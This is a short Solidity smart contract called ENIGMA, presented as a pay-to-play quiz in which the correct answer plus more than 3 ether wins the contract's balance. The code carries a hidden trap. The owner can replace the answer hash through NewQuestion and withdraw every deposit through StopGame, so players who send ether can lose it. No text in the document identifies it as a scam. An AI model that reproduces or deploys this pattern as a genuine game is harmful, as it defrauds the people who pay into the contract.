1 pragma solidity ^0.4.20;
2 
3 contract ENIGMA
4 {
5     function Try(string _response) external payable {
6         require(msg.sender == tx.origin);
7         
8         if(responseHash == keccak256(_response) && msg.value > 3 ether)
9         {
10             msg.sender.transfer(this.balance);
11         }
12     }
13     
14     string public question;
15     
16     address questionSender;
17     
18     bytes32 responseHash;
19  
20     function set_game(string _question,string _response) public payable {
21         if(responseHash==0x0) 
22         {
23             responseHash = keccak256(_response);
24             question = _question;
25             questionSender = msg.sender;
26         }
27     }
28     
29     function StopGame() public payable {
30         require(msg.sender==questionSender);
31         msg.sender.transfer(this.balance);
32     }
33     
34     function NewQuestion(string _question, bytes32 _responseHash) public payable {
35         if(msg.sender==questionSender){
36             question = _question;
37             responseHash = _responseHash;
38         }
39     }
40     
41     function newQuestioner(address newAddress) public {
42         if(msg.sender==questionSender)questionSender = newAddress;
43     }
44     
45     
46     function() public payable{}
47 }